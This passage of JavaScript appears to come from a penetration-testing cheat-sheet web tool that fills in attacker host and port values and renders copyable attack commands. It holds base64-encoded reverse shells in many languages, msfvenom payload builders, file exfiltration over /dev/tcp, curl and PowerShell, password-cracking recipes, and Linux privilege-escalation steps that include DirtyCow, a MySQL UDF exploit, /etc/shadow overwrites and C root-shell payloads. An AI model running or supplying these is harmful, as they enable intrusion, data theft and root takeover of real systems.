      {'title': 'Golang', 'base64': 'ZWNobyAncGFja2FnZSBtYWluO2ltcG9ydCJvcy9leGVjIjtpbXBvcnQibmV0IjtmdW5jIG1haW4oKXt7YyxfOj1uZXQuRGlhbCgidGNwIiwiezB9OnsxfSIpO2NtZDo9ZXhlYy5Db21tYW5kKCIvYmluL3NoIik7Y21kLlN0ZGluPWM7Y21kLlN0ZG91dD1jO2NtZC5TdGRlcnI9YztjbWQuUnVuKCl9fScgPiAvdG1wL3QuZ28gJiYgZ28gcnVuIC90bXAvdC5nbyAmJiBybSAvdG1wL3QuZ28='},
      {'title': 'netcat', 'base64': 'bmMgLWUgL2Jpbi9zaCB7MH0gezF9'},
      {'title': 'netcat', 'base64': 'bmMgLWUgL2Jpbi9iYXNoIHswfSB7MX0='},
      {'title': 'netcat', 'base64': 'bmMgLWMgYmFzaCB7MH0gezF9'},
      {'title': 'netcat (OpenBSD)', 'base64': 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgezB9IHsxfSA+L3RtcC9m'},
      {'title': 'ncat', 'base64': 'bmNhdCB7MH0gezF9IC1lIC9iaW4vYmFzaA=='},
      {'title': 'ncat', 'base64': 'bmNhdCAtLXVkcCB7MH0gezF9IC1lIC9iaW4vYmFzaA=='},
      {'title': 'AWK', 'base64': 'YXdrICdCRUdJTiB7e3MgPSAiL2luZXQvdGNwLzAvezB9L3sxfSI7IHdoaWxlKDQyKSB7eyBkb3t7IHByaW50ZiAic2hlbGw+IiB8JiBzOyBzIHwmIGdldGxpbmUgYzsgaWYoYyl7eyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8JiBzOyBjbG9zZShjKTsgfX0gfX0gd2hpbGUoYyAhPSAiZXhpdCIpIGNsb3NlKHMpOyB9fX19JyAvZGV2L251bGw='},
      {'title': 'lua (Linux)', 'base64': 'bHVhIC1lICJyZXF1aXJlKCdzb2NrZXQnKTtyZXF1aXJlKCdvcycpO3Q9c29ja2V0LnRjcCgpO3Q6Y29ubmVjdCgnezB9JywnezF9Jyk7b3MuZXhlY3V0ZSgnL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMnKTsi'},
      {'title': 'lua', 'base64': 'bHVhNS4xIC1lICdsb2NhbCBob3N0LCBwb3J0ID0gInswfSIsIHsxfSBsb2NhbCBzb2NrZXQgPSByZXF1aXJlKCJzb2NrZXQiKSBsb2NhbCB0Y3AgPSBzb2NrZXQudGNwKCkgbG9jYWwgaW8gPSByZXF1aXJlKCJpbyIpIHRjcDpjb25uZWN0KGhvc3QsIHBvcnQpOyB3aGlsZSB0cnVlIGRvIGxvY2FsIGNtZCwgc3RhdHVzLCBwYXJ0aWFsID0gdGNwOnJlY2VpdmUoKSBsb2NhbCBmID0gaW8ucG9wZW4oY21kLCAiciIpIGxvY2FsIHMgPSBmOnJlYWQoIiphIikgZjpjbG9zZSgpIHRjcDpzZW5kKHMpIGlmIHN0YXR1cyA9PSAiY2xvc2VkIiB0aGVuIGJyZWFrIGVuZCBlbmQgdGNwOmNsb3NlKCkn'},
      {'title': 'Java', 'base64': 'ciA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpO3AgPSByLmV4ZWMoWyIvYmluL3NoIiwiLWMiLCJleGVjIDU8Pi9kZXYvdGNwL3swfS97MX07Y2F0IDwmNSB8IHdoaWxlIHJlYWQgbGluZTsgZG8gXCRsaW5lIDI+JjUgPiY1OyBkb25lIl0gYXMgU3RyaW5nW10pO3Aud2FpdEZvcigpOw=='},
      {'title': 'socat', 'base64': 'c29jYXQgZXhlYzonYmFzaCAtbGknLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5lIHRjcDp7MH06ezF9'},
      {'title': 'socat (Windows)', 'base64': 'c29jYXQuZXhlIC1kIC1kIFRDUDQ6ezB9OnsxfSBFWEVDOidjbWQuZXhlJyxwaXBlcw=='},
      {'title': 'telnet', 'base64': 'cm0gLWYgL3RtcC9wOyBta25vZCAvdG1wL3AgcCAmJiB0ZWxuZXQgezB9IHsxfSAwL3RtcC9w'},
    ];

    // 3. Reverse Shell Files
    this.targetContents['3.ReverseShellFiles'] = [
      {'title': 'Windows', 'cmd': 'msfvenom -p windows/shell_reverse_tcp LHOST={0} LPORT={1} -f exe > win_rshell_{0}_{1}.exe'},
      {'title': 'Linux', 'cmd': 'msfvenom -p linux/x86/shell_reverse_tcp LHOST={0} LPORT={1} -f elf > lin_rshell_{0}_{1}.elf'},
      {'title': 'PHP', 'cmd': 'msfvenom -p php/reverse_php LHOST={0} LPORT={1} -f raw > php_rshell_{0}_{1}.php'},
      {'title': 'Java (.war)', 'cmd': 'msfvenom -p java/jsp_shell_reverse_tcp LHOST={0} LPORT={1} -f raw > war_rshell_{0}_{1}.war'},
      {'title': 'ASPX', 'cmd': 'msfvenom -p windows/shell_reverse_tcp LHOST={0} LPORT={1} -f aspx > aspx_rshell_{0}_{1}.aspx'},
      {'title': 'Meterpreter: Windows', 'cmd': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe > win_met_{0}_{1}.exe'},
      {'title': 'Meterpreter: Linux', 'cmd': 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf > lin_met_{0}_{1}.elf'},
      {'title': 'Meterpreter: PHP', 'cmd': 'msfvenom -p php/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f raw > php_met_{0}_{1}.php'},
      {'title': 'Meterpreter: Java (.war)', 'cmd': 'msfvenom -p java/meterpreter/reverse_http LHOST={0} LPORT={1} -f raw > war_met_{0}_{1}.war'},
      {'title': 'Meterpreter: ASPX', 'cmd': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f aspx > aspx_met_{0}_{1}.aspx'},
    ];
  }

  drawList(index, targetContent, lhost, lport) {
    for (let i = 0; i < targetContent.length; i++) {
      const content = targetContent[i];
      let title = content.title;
      let cmd = "";

      if (content.base64 && content.cmd) {
        // base64デコードしてcmdに埋め込む
        let shell = atob(content.base64);
        shell = shell.replace('{0}', htmlEscape(lhost));
        shell = shell.replace('{1}', htmlEscape(lport));
        cmd = content.cmd.replace('{0}', btoa(shell));
      } else if (content.base64) {
        // base64デコードする
        cmd = atob(content.base64);
        cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
        cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
      } else {
        // コマンドそのまま
        cmd = content.cmd;
        cmd = cmd.replaceAll('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
        cmd = cmd.replaceAll('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
      }

      // Template
      $(this.targetCSSSelectors[index]).append(`
      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
        <div class="ms-2 me-auto" style="width: 80%">
          <div class="fw-bold">${title}</div>
          <code class="copy_target">${cmd}</code>
        </div>
        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
      </li>
      `);
    }
  }
}

// --- Upload and Download -----------------------------------------------------
class UpDown extends MyTool {
  constructor(...args) {
    super(...args);

    // LHOST: {0}, LPORT: {1}, FILE: {2}
    this.targetContents['1.Upload'] = [
      {'title': '1. @Kali (bash)', 'cmd': 'nc -lnvp {1} < {2}'},
      {'title': '2. cat', 'cmd': 'cat < /dev/tcp/{0}/{1} > {2}'},
      {'title': '1. @Kali (curl, wget)', 'cmd': 'python3 -m http.server {1}'},
      {'title': '2. wget', 'cmd': 'wget {0}:{1}/{2}'},
      {'title': '2. curl', 'cmd': 'curl {0}:{1}/{2} -O'},
      {'title': '2. powershell', 'cmd': `powershell -exec bypass -command "(New-Object System.Net.WebClient).DownloadFile('http://{0}:{1}/{2}', '{2}')"`},
      {'title': '2.A. Create wget.vbs', 'cmd': `echo strUrl = WScript.Arguments.Item(0) > wget.vbs; echo StrFile = WScript.Arguments.Item(1) >> wget.vbs; echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs; echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs; echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs; echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs; echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs; echo Err.Clear >> wget.vbs; echo Set http = Nothing >> wget.vbs; echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs; echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs; echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs; echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs; echo http.Open "GET", strURL, False >> wget.vbs; echo http.Send >> wget.vbs; echo varByteArray = http.ResponseBody >> wget.vbs; echo Set http = Nothing >> wget.vbs; echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs; echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs; echo strData = "" >> wget.vbs; echo strBuffer = "" >> wget.vbs; echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs; echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs; echo Next >> wget.vbs; echo ts.Close >> wget.vbs`},
      {'title': '2.B. cscript', 'cmd': 'cscript wget.vbs http://{0}:{1}/{2} {2}'},
    ];

    // LHOST: {0}, LPORT: {1}, FILE: {2}
    this.targetContents['2.Download'] = [
      {'title': '1. @Kali (bash)', 'cmd': 'nc -lvnp {1} > {2}'},
      {'title': '2. bash', 'cmd': 'cat {2} > /dev/tcp/{0}/{1}'},
      {'title': '1. @Kali (curl)', 'cmd': 'wget https://gist.githubusercontent.com/touilleMan/eb02ea40b93e52604938/raw/b5b9858a7210694c8a66ca78cfed0b9f6f8b0ce3/SimpleHTTPServerWithUpload.py'},
      {'title': '2. @Kali (curl)', 'cmd': 'python3 SimpleHTTPServerWithUpload.py'},
      {'title': '3. curl', 'cmd': 'curl {0}:{1} -X POST -F file=@{2}'},
      {'title': '1. @Kali (powershell)', 'cmd': 'python3 SimpleHTTPServerWithUpload.py'},
      {'title': '2. powershell', 'cmd': `powershell -exec bypass -command "(New-Object System.Net.WebClient).UploadFile('http://{0}:{1}','{2}')"`},
    ];
  }

  drawList(index, targetContent, lhost, lport, filename) {
    for (let i = 0; i < targetContent.length; i++) {
      const content = targetContent[i];
      let title = content.title;
      let cmd = content.cmd;
      cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
      cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
      cmd = cmd.replaceAll('{2}', `<span class="bg-warning">${htmlEscape(filename)}</span>`);
      // Template
      $(this.targetCSSSelectors[index]).append(`
      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
        <div class="ms-2 me-auto" style="width: 80%">
          <div class="fw-bold">${title}</div>
          <code class="copy_target">${cmd}</code>
        </div>
        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
      </li>
      `);
    }
  }
}

// ---- Password Cracking ------------------------------------------------------
class PassCrack extends MyTool {
  constructor(...args) {
    super(...args);

    this.targetContents['1'] = [
      {'title': 'hashid (with Hashcat hash mode)', 'cmd': 'hashid -m {0}'},
      {'title': 'Example hashes', 'cmd': 'hashcat --example-hashes | less'},
      {'title': 'Dictionary attack', 'cmd': 'hashcat -a 0 -m HASHMODE {0} /usr/share/wordlists/rockyou.txt'},
      {'title': 'Combination attack', 'cmd': 'hashcat -a 1 -m HASHMODE {0} WORDLIST1.txt WORDLIST2.txt'},
      {'title': 'Mask Attack', 'cmd': `hashcat -a 3 -m HASHMODE {0} -1 012 'P@ssw0rd20?1?d'`, 'memo': `<ul><li>?l = abcdefghijklmnopqrstuvwxyz</li><li>?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ</li><li>?d = 0123456789</li><li>?h = 0123456789abcdef</li><li>?H = 0123456789ABCDEF</li><li>?s = «space»!"#$%&'()*+,-./:;&amp;lt;=&gt;?@[\]^_\`{|}~</li><li>?a = ?l?u?d?s</li><li>?1, ?2, ?3, ?4 = Custom Charsets from -1, -2, -3, -4</li></ul>`},
      {'title': 'Hybrid Mode (Prepend)', 'cmd': `hashcat -a 6 -m HASHMODE {0} -1=012 '20?1?d' /usr/share/wordlists/rockyou.txt`, 'memo': '2015Password'},
      {'title': 'Hybrid Mode (Append)', 'cmd': `hashcat -a 7 -m HASHMODE {0} -1=012 '20?1?d' /usr/share/wordlists/rockyou.txt`, 'memo': 'Password2015'},
      {'title': 'Hashcat Rule', 'cmd': 'hashcat -a 0 -m HASHMODE {0} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule'},
      {'title': '1. Create Custom Hashcat Rule', 'cmd': `echo 'so0 si1 se3 ss5 sa@ c $2 $0 $1 $9' > rule.txt`, 'memo': '<ul><li>l = Convert all letters to lowercase</li><li>u = Convert all letters to uppercase</li><li>c = Capitalize first letter and invert the rest</li><li>^X = Prepend character X</li><li>$X = Append character X</li><li>sXY = Substitute letter from X to Y</li><li>r = Reverse</li></ul>'},
      {'title': '2. Apply Custom Hashcat Rule', 'cmd': 'hashcat -a 0 -m HASHMODE {0} /usr/share/wordlists/rockyou.txt -r rule.txt'},
    ];
  }

  drawList(index, targetContent, filename) {
    for (let i = 0; i < targetContent.length; i++) {
      const content = targetContent[i];
      let title = content.title;
      let cmd = content.cmd;
      let memo = content.memo || "";
      cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(filename)}</span>`);
      // Template
      $(this.targetCSSSelectors[index]).append(`
      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
        <div class="ms-2 me-auto" style="width: 80%">
          <div class="fw-bold">${title}</div>
          <code class="copy_target">${cmd}</code>
          ${(memo === "") ? "": `<p class="ms-3 mt-2">${memo}</p>`}
        </div>
        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
      </li>
      `);
    }
  }
}

// ---- Privilege Escalation ---------------------------------------------------
class PrivEsc extends MyTool {
  constructor(...args) {
    super(...args);

    this.targetContents['1.Linux'] = [
      {'title': '1. DirtyCow', 'cmd': 'wget https://gist.githubusercontent.com/KrE80r/42f8629577db95782d5e4f609f437a54/raw/71c902f55c09aa8ced351690e1e627363c231b45/c0w.c'},
      {'title': '2. DirtyCow - compile exploit', 'cmd': 'gcc -pthread c0w.c -o c0w && ./c0w'},
      {'title': '3. DirtyCow - priv esc', 'cmd': '/usr/bin/passwd'},
      {'title': '1. MySQL 4.x/5.0 UDF', 'cmd': 'wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c'},
      {'title': '2. MySQL 4.x/5.0 UDF - compile exploit', 'cmd': 'gcc -g -c raptor_udf2.c -fPIC'},
      {'title': '3. MySQL 4.x/5.0 UDF - create shared object', 'cmd': 'gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc'},
      {'title': '4. MySQL 4.x/5.0 UDF', 'cmd': 'mysql -u root -p'},
      {'title': '5. MySQL 4.x/5.0 UDF', 'cmd': 'use mysql;'},
      {'title': '6. MySQL 4.x/5.0 UDF', 'cmd': 'create table foo(line blob);'},
      {'title': '7. MySQL 4.x/5.0 UDF', 'cmd': `insert into foo values(load_file('/tmp/raptor_udf2.so'));`},
      {'title': '8. MySQL 4.x/5.0 UDF', 'cmd': `select * from foo into dumpfile '/usr/lib/raptor_udf2.so';`},
      {'title': '9. MySQL 4.x/5.0 UDF - create User Defined Function', 'cmd': `create function do_system returns integer soname 'raptor_udf2.so';`},
      {'title': '10. MySQL 4.x/5.0 UDF', 'cmd': `select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');`},
      {'title': '11. MySQL 4.x/5.0 UDF - priv esc', 'cmd': '/tmp/rootbash -p'},
      {'title': 'Port Forwarding', 'cmd': 'ssh -R LOCAL_PORT:127.0.0.1:TARGET_PORT USERNAME@RHOST'},
      {'title': 'Find all writable files in /etc', 'cmd': 'find /etc -maxdepth 1 -writable -type f'},
      {'title': 'Find all readable files in /etc', 'cmd': 'find /etc -maxdepth 1 -readable -type f'},
      {'title': 'Find all directories which can be written to', 'cmd': 'find / -executable -writable -type d 2> /dev/null'},
      {'title': '1. /etc/shadow - Readable', 'cmd': 'ls -l /etc/shadow'},
      {'title': '2. /etc/shadow - Readable', 'cmd': 'head -n 1 /etc/shadow | cut -d: -f2 > hash.txt'},
      {'title': '3. /etc/shadow - Readable (@Kali)', 'cmd': 'john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt'},
      {'title': '4. /etc/shadow - Readable', 'cmd': 'su', 'memo': 'Use the su command to switch to the root user, entering the password we cracked when prompted.'},
      {'title': '1. /etc/shadow - Writable', 'cmd': 'ls -l /etc/shadow'},
      {'title': '2. /etc/shadow - Writable', 'cmd': 'cp /etc/shadow /tmp/shadow.bak'},
      {'title': '3. /etc/shadow - Writable (@Kali)', 'cmd': 'mkpasswd -m sha-512 "newpassword"', 'memo': 'Replace the root user\'s password hash with the one we generated.<br>root:$6$Tb/euwmK$OXA.dwMeOAcop...MdwD3B0fGxJI0:17298:0:99999:7:::'},
      {'title': '4. /etc/shadow - Writable', 'cmd': 'su', 'memo': 'Use the su command to switch to the root user, entering the new password when prompted.'},
      {'title': '1. /etc/passwd - Writable', 'cmd': 'ls -l /etc/passwd'},
      {'title': '2. /etc/passwd - Writable (@Kali)', 'cmd': 'openssl passwd "newpassword"', 'memo': 'Replace the root user\'s password hash with the one we generated.<br>root:L9yLGxncbOROc:0:0:root:/root:/bin/bash'},
      {'title': '3. /etc/passwd - Writable', 'cmd': 'su', 'memo': 'Use the su command to switch to the newroot user.'},
      {'title': '1. SSH Key', 'cmd': 'ssh-keygen -f ROOT_PRIVATE_KEY'},
      {'title': '2. SSH Key', 'cmd': 'echo "ROOT_PUBLIC_KEY" >> authorized_keys'},
      {'title': '3. SSH Key', 'cmd': 'ssh root@{0} -i ROOT_PRIVATE_KEY'},
      {'title': '1. List the programs your users is allowed to run.', 'cmd': 'sudo -l'},
      {'title': '2. Check CTFOBins', 'cmd': 'https://gtfobins.github.io/'},
      {'title': 'sudo', 'cmd': 'sudo su'},
      {'title': 'sudo (When su is not allowed)', 'cmd': 'sudo -s'},
      {'title': 'sudo (When su is not allowed)', 'cmd': 'sudo -i'},
      {'title': 'sudo (When su is not allowed)', 'cmd': 'sudo /bin/bash'},
      {'title': '1. LD_PRELOAD', 'cmd': 'sudo -l', 'memo': 'env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH'},
      {'title': '2. Create a file (preload.c)', 'code': `#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}`},
      {'title': '3. Compile to preload.so', 'cmd': 'gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c'},
      {'title': '4. Run any allowed program using sudo', 'cmd': 'sudo LD_PRELOAD=/tmp/preload.so apache2'},
      {'title': '1. Run ldd against the apache2 program file', 'cmd': 'ldd /usr/sbin/apache2', 'memo': 'ex) libcrypt.so.1 => /lib/libcrypt.so.1'},
      {'title': '2. Create a file (library_path.c)', 'code': `#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
static void hijack() __attribute__((constructor));
void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}`},
      {'title': '3. Compile to libcrypt.so.1', 'cmd': 'gcc -o libcrypt.so.1 -shared -fPIC library_path.c'},
      {'title': '4. Run apache2 using sudo with LD_LIBRARY_PATH to the current path', 'cmd': 'sudo LD_LIBRARY_PATH=. apache2'},
      {'title': '1. Finding SUID / SGID Files', 'cmd': 'find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \; 2> /dev/null'},
      {'title': '2. Run strace on the SUID file', 'cmd': 'strace /usr/local/bin/CMD 2>&1 | grep -iE "open|access|no such file"', 'memo': 'open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)'},
      {'title': '3. Create a library (libcalc.c)', 'code': `#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
static void inject() __attribute__((constructor)); void inject() {
setuid(0);
    system("/bin/bash -p");
}`},
      {'title': '4. Compile libcalc.c into /home/user/.config/libcalc.so', 'cmd': 'gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c'},
      {'title': '5. Run the SUID executable', 'cmd': '/usr/local/bin/CMD'},
      {'title': '1. Finding SUID / SGID Files', 'cmd': 'find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \; 2> /dev/null'},
      {'title': '2. Run strings on the SUID file', 'cmd': 'strings /usr/local/bin/CMD', 'memo': 'service apache2 start'},
      {'title': '3. Run with strace', 'cmd': 'strace -v -f -e execve /usr/local/bin/CMD 2>&1 | grep service', 'memo': '[pid 14395] execve("/bin/sh", ["sh", "-c", "service apache2 start"]'},
      {'title': '3. Run with ltrace', 'cmd': 'ltrace /usr/local/bin/CMD 2>&1 | grep service', 'memo': 'system("service apache2 start")'},
      {'title': '4. Create a file service.c', 'code': `int main() {
    setuid(0);
    system("/bin/bash -p");
}`},
      {'title': '5. Compile service.c into a file called service', 'cmd': 'gcc -o service service.c'},
      {'title': '6. Prepend the current directory to the PATH and execute SUID file', 'cmd': 'PATH=.:$PATH /usr/local/bin/CMD'},
      {'title': '1. If bash is lower than 4.2-048', 'cmd': 'bash --version', 'memo': 'GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)'},
      {'title': '2. Run with strace', 'cmd': 'strace -v -f -e execve /usr/local/bin/CMD 2>&1 | grep service', 'memo': '[pid 14395] execve("/bin/sh", ["sh", "-c", "/usr/sbin/service apache2 start"]'},
      {'title': '3. Create a Bash function with the name "/usr/sbin/service" and export the function', 'cmd': 'function /usr/sbin/service { /bin/bash -p; }; export –f /usr/sbin/service'},
      {'title': '4. Execute the SUID file', 'cmd': '/usr/local/bin/CMD'},
      {'title': '1. Run the SUID file with bash debugging enabled and the PS4 variable assigned to our payload', 'cmd': `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2`, 'memo': 'In Bash versions 4.3 and below'},
      {'title': '2. Run the rootbash', 'cmd': '/tmp/rootbash -p'},
      {'title': 'Show the NFS server’s export list', 'cmd': 'showmount -e RHOST'},
      {'title': 'Show the NFS server’s export list', 'cmd': 'nmap –sV –script=nfs-showmount RHOST'},
      {'title': 'Mount an NFS share', 'cmd': 'mount -o rw,vers=2 RHOST:SHARE LOCAL_DIRECTORY'},
      {'title': '1. NFS - Check exports', 'cmd': 'cat /etc/exports', 'memo': '/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)'},
      {'title': '2. NFS - Check shares', 'cmd': 'showmount -e RHOST'},
      {'title': '3. NFS @Kali ', 'cmd': 'mkdir /tmp/nfs'},
      {'title': '4. NFS @Kali', 'cmd': 'mount -o rw,vers=2 RHOST:/tmp /tmp/nfs'},
      {'title': '5. NFS @Kali - Generate payload', 'cmd': 'msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf'},
      {'title': '6. NFS @Kali', 'cmd': 'chmod +xs /tmp/nfs/shell.elf'},
      {'title': '7. NFS - Execute the file', 'cmd': '/tmp/shell.elf'},
      {'title': '', 'cmd': ''},
    ];

    this.targetContents['2.Windows'] = [
      {'title': '1. PowerUp', 'PS': '$', 'cmd': 'wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'},
      {'title': '2. PowerUp', 'PS': 'PS>', 'cmd': '. .\\PowerUp.ps1'},
      {'title': '3. PowerUp', 'PS': 'PS>', 'cmd': 'Invoke-AllChecks'},
      {'title': '1. winPEAS', 'PS': '$', 'cmd': 'wget https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe'},
      {'title': '2. winPEAS', 'PS': '>', 'cmd': '.\\winPEASany.exe quiet cmd fast'},
      {'title': '', 'cmd': ''},
      {'title': '', 'cmd': ''},
    ];
    
  }

  drawList(index, targetContent, lhost, lport) {
    for (let i = 0; i < targetContent.length; i++) {
      const content = targetContent[i];
      let title = content.title;
      let cmd = content.cmd;
      let memo = content.memo || "";
      if (content.code) {
        cmd = content.code;
      }
      cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
      cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
      // Template
      $(this.targetCSSSelectors[index]).append(`
      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
        <div class="ms-2 me-auto" style="width: 80%">
          <div class="fw-bold">${title}</div>
          ${content.PS ? `<code class="text-secondary">${content.PS} </code>` : ""}
          <code class="copy_target">${content.code ? "<pre>" : ""}${cmd}${content.code ? "</pre>" : ""}</code>
          ${(memo === "") ? "": `<p class="ms-3 mt-2">${memo}</p>`}
        </div>
        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
      </li>
      `);
    }
  }
}


function htmlEscape(str) {
  if (!str) return;
  return str.replace(/[<>&"'`]/g, function (match) {
    const escape = {
      '<': '&lt;',
      '>': '&gt;',
      '&': '&amp;',
      '"': '&quot;',
      "'": '&#39;',
      '`': '&#x60;'
    };
    return escape[match];
  });
}
